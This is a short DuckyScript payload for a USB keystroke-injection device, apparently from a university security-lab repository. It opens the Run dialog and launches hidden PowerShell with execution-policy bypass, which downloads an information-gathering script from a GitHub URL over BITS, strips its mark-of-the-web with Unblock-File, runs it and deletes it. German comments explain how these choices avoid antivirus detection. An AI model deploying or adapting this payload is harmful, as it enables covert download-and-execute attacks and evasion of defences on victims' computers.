REM      selten von AV geflaggt
REM    - Unblock-File entfernt Zone.Identifier ADS (Internet-Markierung)
REM    - Kein IEX, kein scriptblock, kein WebClient im Run-Befehl

GUI r
DELAY 1000
STRINGLN %ComSpec% /c powershell -nop -ep bypass -w h -c "Import-Module BitsTransfer;Start-BitsTransfer 'https://raw.githubusercontent.com/raphaelbleier/security-lab-aau-ss26-rubber-ducky/main/W02a/scripts/info_gather.ps1' $env:TEMP\r.ps1;Unblock-File $env:TEMP\r.ps1;& $env:TEMP\r.ps1;ri $env:TEMP\r.ps1 -f -ea 0"
